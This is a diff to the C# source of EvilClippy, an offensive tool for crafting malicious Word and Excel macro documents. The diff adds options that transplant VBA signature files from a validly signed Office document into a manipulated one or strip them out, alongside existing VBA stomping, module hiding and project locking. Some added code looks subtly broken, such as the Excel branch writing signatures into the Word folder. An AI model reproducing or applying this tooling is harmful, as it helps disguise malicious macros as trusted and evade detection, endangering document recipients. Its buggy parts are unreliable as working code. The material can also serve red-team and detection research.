@@ -5,7 +5,7 @@
 // Date: 20200415
 // Version: 1.3 (added GUI unhide option)
 //
-// Special thanks to Carrie Roberts (@OrOneEqualsOne) from Walmart for her contributions to this project.
+// Special thanks to Carrie Robberts (@OrOneEqualsOne) from Walmart for her contributions to this project.
 //
 // Compilation instructions
 // Mono: mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
@@ -33,9 +33,9 @@ public class MSOfficeManipulator
 	// Filename of the document that is about to be manipulated
 	static string filename = "";
 
-        // Name of the generated output file.
-        static string outFilename = "";
-    
+	// Name of the generated output file.
+	static string outFilename = "";
+
 	// Compound file that is under editing
 	static CompoundFile cf;
 
@@ -83,12 +83,49 @@ public class MSOfficeManipulator
 		// Option to set locked/unviewable options in Project Stream
 		bool optionUnviewableVBA = false;
 
-        // Option to set unlocked/viewable options in Project Stream
-        bool optionViewableVBA = false;
+		// Option to set unlocked/viewable options in Project Stream
+		bool optionViewableVBA = false;
 
-        // Temp path to unzip OpenXML files to
-        String unzipTempPath = "";
+		// Option to read VBA source from file wihtout stomping
+		bool optionReadVBASourceFromFile = false;
 
+		// Erase Signature Agile
+		bool optionEraseSignatureAgileFile = false;
+
+		// Erase SignatureV3 
+		bool optionEraseSignatureV3File = false;
+
+		// Filename to write VBA
+		string writeVBASourceToFile = "";
+
+		// Valid Legacy Signature File
+		string optionCopyCombObjFile = "";
+
+		// Valid Signature File
+		string optionCopySignatureFile = "";
+
+		// Valid Agile Signature File
+		string optionCopySignatureAgileFile = "";
+
+		// Valid SignatureV3 File
+		string optionCopySignatureV3File = "";
+
+		// Office Document with Valid Signature 
+		string optionValidOfficeFile = "";
+
+		// Content_Types.xml File to copy into new doc
+		string optionContentTypesFile = "";
+
+		// Variable for new VBA Source Code from other Office File
+		string newVBASource = "";
+
+		// Temp path to unzip OpenXML files to
+		String unzipTempPath = "";
+
+		// Temp path to get valid Signature from
+		String unzipTempPath_VS = "";
+
+		Boolean deleteCompObj = false;
 
 		// Start parsing command line arguments
 		var p = new OptionSet() {
@@ -112,13 +149,35 @@ public class MSOfficeManipulator
 			{ "rr|resetmodulenames", "Undo the set random module names by making the ASCII module names in the DIR stream match their Unicode counter parts",
 				v => optionResetModuleNames = v != null },
 			{ "u|unviewableVBA", "Make VBA Project unviewable/locked.",
-                v => optionUnviewableVBA = v != null },
-            { "uu|viewableVBA", "Make VBA Project viewable/unlocked.",
-                v => optionViewableVBA = v != null },
-            { "v", "Increase debug message verbosity.",
+				v => optionUnviewableVBA = v != null },
+			{ "uu|viewableVBA", "Make VBA Project viewable/unlocked.",
+				v => optionViewableVBA = v != null },
+			{ "v", "Increase debug message verbosity.",
 				v => { if (v != null) ++verbosity; } },
 			{ "h|help",  "Show this message and exit.",
 				v => optionShowHelp = v != null },
+			{ "x|readVBASource",  "Read VBA Source from given file without stomping anything.",
+				v => optionReadVBASourceFromFile = v != null },
+			{ "a|eraseSignatureAgileFile",  "erase Signature Agile File from new document.",
+				v => optionEraseSignatureAgileFile = v != null },
+			{ "3|eraseSignatureV3File",  "erase SignatureV3 File from new document.",
+				v => optionEraseSignatureV3File = v != null },
+			{ "z|CombObjFile=",  "Legacy Signature File to copy into the new document.",
+				v => optionCopyCombObjFile = v },
+			{ "dz|deleteCombObjFile",  "Delete Legacy Signature File from document.",
+				v => deleteCompObj = v != null},
+			{ "c|signatureFile=",  "Signature File to copy into the new document.",
+				v => optionCopySignatureFile = v },
+			{ "cc|signatureAgileFile=",  "SignatureAgile File (Office 2016+) to copy into the new document.",
+				v => optionCopySignatureAgileFile = v },
+			{ "ccc|signatureV3File=",  "SignatureV3 File (Microsoft 365) to copy into the new document.",
+				v => optionCopySignatureV3File = v },
+			{ "f|sourceOfficeFile=",  "Office file with valid Signature to copy into the new document.",
+				v => optionValidOfficeFile = v },
+			{ "ct|sourceContentTypesFile=",  "[Content_Types.xml] file to copy into the new document.",
+				v => optionContentTypesFile = v },
+			{ "o|writeVBASource=",  "Write VBA Source to given outfile.",
+				v => writeVBASourceToFile = v },
 		};
 
 		List<string> extra;
@@ -153,13 +212,85 @@ public class MSOfficeManipulator
 		outFilename = getOutFilename(filename);
 		string oleFilename = outFilename;
 
+		if (optionValidOfficeFile != "")
+		{
+			(optionCopySignatureFile, optionCopySignatureAgileFile, optionCopySignatureV3File, unzipTempPath_VS) = getSignatureFromFile(optionValidOfficeFile, verbosity);
+			DebugLog("found Singature File: " + optionCopySignatureFile);
+		}
+
 		// Attempt to unzip as docm or xlsm OpenXML format
 		try
 		{
 			unzipTempPath = CreateUniqueTempDirectory();
 			ZipFile.ExtractToDirectory(filename, unzipTempPath);
-			if (File.Exists(Path.Combine(unzipTempPath, "word", "vbaProject.bin"))) { oleFilename = Path.Combine(unzipTempPath, "word", "vbaProject.bin"); }
-			else if (File.Exists(Path.Combine(unzipTempPath, "xl", "vbaProject.bin"))) { oleFilename = Path.Combine(unzipTempPath, "xl", "vbaProject.bin"); }
+			if (File.Exists(Path.Combine(unzipTempPath, "word", "vbaProject.bin")))
+			{
+				oleFilename = Path.Combine(unzipTempPath, "word", "vbaProject.bin");
+				if (optionCopySignatureFile != "")
+				{
+					File.Copy(optionCopySignatureFile, Path.Combine(unzipTempPath, "word", "vbaProjectSignature.bin"), true);
+					if(optionContentTypesFile == "")
+                    {
+						File.Copy(Path.Combine(unzipTempPath_VS, "[Content_Types].xml"), Path.Combine(unzipTempPath, "[Content_Types].xml"), true);
+					}
+                    else
+                    {
+						File.Copy(optionContentTypesFile, Path.Combine(unzipTempPath, "[Content_Types].xml"), true);
+					}
+				}
+				if (optionCopySignatureAgileFile != "")
+				{
+					File.Copy(optionCopySignatureAgileFile, Path.Combine(unzipTempPath, "word", "vbaProjectSignatureAgile.bin"), true);
+					optionEraseSignatureAgileFile = false;
+				}
+				if (optionEraseSignatureAgileFile)
+				{
+					File.Delete(Path.Combine(unzipTempPath, "word", "vbaProjectSignatureAgile.bin"));
+				}
+				if (optionCopySignatureV3File != "")
+				{
+					File.Copy(optionCopySignatureV3File, Path.Combine(unzipTempPath, "word", "vbaProjectSignatureV3.bin"), true);
+					optionEraseSignatureV3File = false;
+				}
+				if (optionEraseSignatureV3File)
+				{
+					File.Delete(Path.Combine(unzipTempPath, "word", "vbaProjectSignatureV3.bin"));
+				}
+			}
+			else if (File.Exists(Path.Combine(unzipTempPath, "xl", "vbaProject.bin")))
+			{
+				oleFilename = Path.Combine(unzipTempPath, "xl", "vbaProject.bin");
+				if (optionCopySignatureFile != "")
+				{
+					File.Copy(optionCopySignatureFile, Path.Combine(unzipTempPath, "xl", "vbaProjectSignature.bin"), true);
+					if (optionContentTypesFile == "")
+					{
+						File.Copy(Path.Combine(unzipTempPath_VS, "[Content_Types].xml"), Path.Combine(unzipTempPath, "[Content_Types].xml"), true);
+					}
+					else
+					{
+						File.Copy(optionContentTypesFile, Path.Combine(unzipTempPath, "[Content_Types].xml"), true);
+					}
+				}
+				if (optionCopySignatureAgileFile != "")
+				{
+					File.Copy(optionCopySignatureAgileFile, Path.Combine(unzipTempPath, "word", "vbaProjectSignatureAgile.bin"), true);
+					optionEraseSignatureAgileFile = false;
+				}
+				if (optionEraseSignatureAgileFile)
+				{
+					File.Delete(Path.Combine(unzipTempPath, "xl", "vbaProjectSignatureAgile.bin"));
+				}
+				if (optionCopySignatureV3File != "")
+				{
+					File.Copy(optionCopySignatureV3File, Path.Combine(unzipTempPath, "word", "vbaProjectSignatureV3.bin"), true);
+					optionEraseSignatureV3File = false;
+				}
+				if (optionEraseSignatureV3File)
+				{
+					File.Delete(Path.Combine(unzipTempPath, "xl", "vbaProjectSignatureV3.bin"));
+				}
+			}
 			is_OpenXML = true;
 		}
 		catch (Exception)
@@ -183,8 +314,9 @@ public class MSOfficeManipulator
 			return;
 		}
 
-        // Read relevant streams
-        CFStorage commonStorage = cf.RootStorage; // docm or xlsm
+		// Read relevant streams
+		CFStorage commonStorage = cf.RootStorage; // docm or xlsm
+		CFStorage testStorage = commonStorage;
 		if (cf.RootStorage.TryGetStorage("Macros") != null) commonStorage = cf.RootStorage.GetStorage("Macros"); // .doc
 		if (cf.RootStorage.TryGetStorage("_VBA_PROJECT_CUR") != null) commonStorage = cf.RootStorage.GetStorage("_VBA_PROJECT_CUR"); // xls		
 		vbaProjectStream = commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").GetData();
@@ -204,48 +336,63 @@ public class MSOfficeManipulator
 		DebugLog("Hex dump of original dir stream:\n" + Utils.HexDump(dirStream));
 		DebugLog("Hex dump of original project stream:\n" + Utils.HexDump(projectStream));
 
+		if(optionCopyCombObjFile != "")
+        {
+			byte [] cObj = File.ReadAllBytes(optionCopyCombObjFile);
+			if(deleteCompObj)
+            {
+				testStorage.Delete("\x01" + "CompObj");
+				testStorage.Delete("\x05" + "SummaryInformation");
+				testStorage.Delete("\x05" + "DocumentSummaryInformation");
+				testStorage.Delete("WordDocument");
+			}
+			testStorage.AddStream("FakeCompObj");
+			testStorage.GetStream("FakeCompObj").SetData(cObj);
+		}
+
 		// Replace Office version in _VBA_PROJECT stream
 		if (targetOfficeVersion != "")
 		{
 			ReplaceOfficeVersionInVBAProject(vbaProjectStream, targetOfficeVersion);
 			commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(vbaProjectStream);
 		}
-        //Set ProjectProtectionState and ProjectVisibilityState to locked/unviewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c
-        if (optionUnviewableVBA)
-        {
-            string tmpStr                 = Regex.Replace(projectStreamString, "CMG=\".*\"", "CMG=\"\"");
-            string newProjectStreamString = Regex.Replace(tmpStr             ,  "GC=\".*\"", "GC=\"\"" );
-            // Write changes to project stream
-            commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
-        }
+		//Set ProjectProtectionState and ProjectVisibilityState to locked/unviewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c
+		if (optionUnviewableVBA)
+		{
+			string tmpStr = Regex.Replace(projectStreamString, "CMG=\".*\"", "CMG=\"\"");
+			string newProjectStreamString = Regex.Replace(tmpStr, "GC=\".*\"", "GC=\"\"");
+			// Write changes to project stream
+			commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
+		}
 
-        //Set ProjectProtectionState and ProjectVisibilityState to be viewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c
-        if (optionViewableVBA)
-        {
+		//Set ProjectProtectionState and ProjectVisibilityState to be viewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c
+		if (optionViewableVBA)
+		{
 			Console.WriteLine("Making the project visible...");
 			// Console.WriteLine("Stream before: " + projectStreamString);					
 			string tmpStr = projectStreamString;
-		    	   tmpStr = Regex.Replace(tmpStr, "CMG=\"?.*\"?", "CMG=\"CAC866BE34C234C230C630C6\"");
-		       	   tmpStr = Regex.Replace(tmpStr,  "ID=\"?.*\"?", "ID=\"{00000000-0000-0000-0000-000000000000}\"");
-		       	   tmpStr = Regex.Replace(tmpStr, "DPB=\"?.*\"?", "DPB=\"94963888C84FE54FE5B01B50E59251526FE67A1CC76C84ED0DAD653FD058F324BFD9D38DED37\"");
-		           tmpStr = Regex.Replace(tmpStr,  "GC=\"?.*\"?", "GC=\"5E5CF2C27646414741474\"");
+			tmpStr = Regex.Replace(tmpStr, "CMG=\"?.*\"?", "CMG=\"CAC866BE34C234C230C630C6\"");
+			tmpStr = Regex.Replace(tmpStr, "ID=\"?.*\"?", "ID=\"{00000000-0000-0000-0000-000000000000}\"");
+			tmpStr = Regex.Replace(tmpStr, "DPB=\"?.*\"?", "DPB=\"94963888C84FE54FE5B01B50E59251526FE67A1CC76C84ED0DAD653FD058F324BFD9D38DED37\"");
+			tmpStr = Regex.Replace(tmpStr, "GC=\"?.*\"?", "GC=\"5E5CF2C27646414741474\"");
 			string newProjectStreamString = tmpStr;
 			// Console.WriteLine("Stream afterw: " + newProjectStreamString);					
 
-            // Write changes to project stream
-            commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
-        }
+			// Write changes to project stream
+			commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
+		}
 
 
-        // Hide modules from GUI
-        if (optionHideInGUI)
+		// Hide modules from GUI
+		if (optionHideInGUI)
 		{
 			foreach (var vbaModule in vbaModules)
 			{
-				if ((vbaModule.moduleName != "ThisDocument") && (vbaModule.moduleName != "ThisWorkbook"))
+				if ((vbaModule.moduleName != "ThisDocument") && (vbaModule.moduleName != "ThisWorkbook") && (vbaModule.moduleName != "DieseArbeitsmappe"))
 				{
 					Console.WriteLine("Hiding module: " + vbaModule.moduleName);
 					projectStreamString = projectStreamString.Replace("Module=" + vbaModule.moduleName, "");
+					projectStreamString = projectStreamString.Replace("Document=" + vbaModule.moduleName, "");
 				}
 			}
 
@@ -278,6 +425,41 @@ public class MSOfficeManipulator
 				// write changes to project stream
 				commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(projectStreamString));
 			}
+		}
+
+
+		// Read VBA source from File
+		if (optionReadVBASourceFromFile)
+		{
+			byte[] streamBytes;
+			string vbaSourceString = "";
+
+			foreach (var vbaModule in vbaModules)
+			{
+				streamBytes = commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).GetData();
+
+				vbaSourceString = GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset).Trim();
+				if (writeVBASourceToFile != "")
+				{
+					try
+					{
+						System.IO.File.WriteAllText(writeVBASourceToFile, vbaSourceString);
+					}
+					catch (Exception e)
+					{
+						Console.WriteLine("ERROR: Could not open file write " + writeVBASourceToFile);
+						Console.WriteLine("Please make sure this file exists and contains ASCII only characters.");
+						Console.WriteLine();
+						Console.WriteLine(e.Message);
+						return;
+					}
+				}
+				else
+				{
+					Console.WriteLine("Existing VBA source:\n" + vbaSourceString);
+				}
+			}
+
 		}
 
 		// Stomp VBA modules
@@ -319,6 +501,38 @@ public class MSOfficeManipulator
 					DebugLog("Replacing with VBA code:\n" + newVBACode);
 
 					streamBytes = ReplaceVBATextInModuleStream(streamBytes, vbaModule.textOffset, newVBACode);
+
+					DebugLog("Hex dump of VBA module stream " + vbaModule.moduleName + ":\n" + Utils.HexDump(streamBytes));
+
+					commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).SetData(streamBytes);
+				}
+			}
+		}
+
+
+		// Stomp VBA modules from other Office File
+		if (newVBASource != "")
+		{
+			byte[] streamBytes;
+
+			foreach (var vbaModule in vbaModules)
+			{
+				DebugLog("VBA module name: " + vbaModule.moduleName + "\nOffset for code: " + vbaModule.textOffset);
+
+				// If this module is a target module, or if no targets are specified, then stomp
+				if (targetModules.Contains(vbaModule.moduleName) || !targetModules.Any())
+				{
+					Console.WriteLine("Now stomping VBA code in module: " + vbaModule.moduleName);
+
+					streamBytes = commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).GetData();
+
+					DebugLog("Existing VBA source:\n" + GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset));
+
+					// Get new VBA source code from specified text file. If not specified, VBA code is removed completely.
+
+					DebugLog("Replacing with VBA code:\n" + newVBASource);
+
+					streamBytes = ReplaceVBATextInModuleStream(streamBytes, vbaModule.textOffset, newVBASource);
 
 					DebugLog("Hex dump of VBA module stream " + vbaModule.moduleName + ":\n" + Utils.HexDump(streamBytes));
 
@@ -370,10 +584,14 @@ public class MSOfficeManipulator
 		// Zip the file back up as a docm or xlsm
 		if (is_OpenXML)
 		{
-			if (File.Exists(outFilename)) File.Delete(outFilename);
-			ZipFile.CreateFromDirectory(unzipTempPath, outFilename);
-			// Delete Temporary Files
-			Directory.Delete(unzipTempPath, true);
+			if (optionReadVBASourceFromFile == false)
+			{
+				if (File.Exists(outFilename)) File.Delete(outFilename);
+				ZipFile.CreateFromDirectory(unzipTempPath, outFilename);
+			}
+				// Delete Temporary Files
+				Directory.Delete(unzipTempPath, true);
+				if (unzipTempPath_VS != "") Directory.Delete(unzipTempPath_VS, true);
 		}
 
 		// Start web server, if option is specified
@@ -410,6 +628,60 @@ public class MSOfficeManipulator
 		return vbaModulesNamesFromProjectwm;
 	}
 
+	public static (string, string, string, string) getSignatureFromFile(String filename, int verbosity)
+	{
+
+		// OLE Filename (make a copy so we don't overwrite the original)
+		string stompFilename = getOutFilename(filename);
+
+		string validSignatureFile = "";
+		string validSignatureAgileFile = "";
+		string validSignatureV3File = "";
+		String unzipTempPath2 = "";
+
+
+		try
+		{
+			unzipTempPath2 = CreateUniqueTempDirectory();
+			ZipFile.ExtractToDirectory(filename, unzipTempPath2);
+			if (File.Exists(Path.Combine(unzipTempPath2, "word", "vbaProject.bin")))
+			{
+				validSignatureFile = Path.Combine(unzipTempPath2, "word", "vbaProjectSignature.bin");
+				if (File.Exists(Path.Combine(unzipTempPath2, "word", "vbaProjectSignatureAgile.bin")))
+				{
+					validSignatureAgileFile = Path.Combine(unzipTempPath2, "word", "vbaProjectSignatureAgile.bin");
+				}
+				if (File.Exists(Path.Combine(unzipTempPath2, "word", "vbaProjectSignatureV3.bin")))
+				{
+					validSignatureV3File = Path.Combine(unzipTempPath2, "word", "vbaProjectSignatureV3.bin");
+				}
+			}
+			else if (File.Exists(Path.Combine(unzipTempPath2, "xl", "vbaProject.bin")))
+			{
+				validSignatureFile = Path.Combine(unzipTempPath2, "xl", "vbaProjectSignature.bin");
+				if (File.Exists(Path.Combine(unzipTempPath2, "xl", "vbaProjectSignatureAgile.bin")))
+				{
+					validSignatureAgileFile = Path.Combine(unzipTempPath2, "xl", "vbaProjectSignatureAgile.bin");
+				}
+				if (File.Exists(Path.Combine(unzipTempPath2, "xl", "vbaProjectSignatureV3.bin")))
+				{
+					validSignatureV3File = Path.Combine(unzipTempPath2, "xl", "vbaProjectSignatureV3.bin");
+				}
+			}
+
+		}
+		catch (Exception)
+		{
+			// Not OpenXML format, Maybe 97-2003 format, Make a copy
+			if (File.Exists(stompFilename)) File.Delete(stompFilename);
+			File.Copy(filename, stompFilename);
+		}
+
+
+		return (validSignatureFile, validSignatureAgileFile, validSignatureV3File, unzipTempPath2);
+
+	}
+
 	public static string getOutFilename(String filename)
 	{
 		string fn = Path.GetFileNameWithoutExtension(filename);
@@ -429,19 +701,19 @@ public class MSOfficeManipulator
 	{
 		Console.WriteLine("Serving request from " + request.RemoteEndPoint.ToString() + " with user agent " + request.UserAgent);
 
-                CompoundFile cf = null;
-                try
-                {
-                    cf = new CompoundFile(outFilename, CFSUpdateMode.Update, 0);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine("ERROR: Could not open file " + outFilename);
-                    Console.WriteLine("Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.");
-                    Console.WriteLine();
-                    Console.WriteLine(e.Message);
-                }
-                
+		CompoundFile cf = null;
+		try
+		{
+			cf = new CompoundFile(outFilename, CFSUpdateMode.Update, 0);
+		}
+		catch (Exception e)
+		{
+			Console.WriteLine("ERROR: Could not open file " + outFilename);
+			Console.WriteLine("Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.");
+			Console.WriteLine();
+			Console.WriteLine(e.Message);
+		}
+
 		CFStream streamData = cf.RootStorage.GetStorage("Macros").GetStorage("VBA").GetStream("_VBA_PROJECT");
 		byte[] streamBytes = streamData.GetData();
 
@@ -455,7 +727,7 @@ public class MSOfficeManipulator
 		cf.Commit();
 		cf.Close();
 
-                Console.WriteLine("Serving out file '" + outFilename + "'");
+		Console.WriteLine("Serving out file '" + outFilename + "'");
 		return File.ReadAllBytes(outFilename);
 	}
 
@@ -534,11 +806,11 @@ public class MSOfficeManipulator
 			case "2016x64":
 				version[0] = 0xB2;
 				version[1] = 0x00;
-				break;				
+				break;
 			case "2019x64":
 				version[0] = 0xB2;
 				version[1] = 0x00;
-				break;				
+				break;
 			default:
 				Console.WriteLine("ERROR: Incorrect MS Office version specified - skipping this step.");
 				return moduleStream;
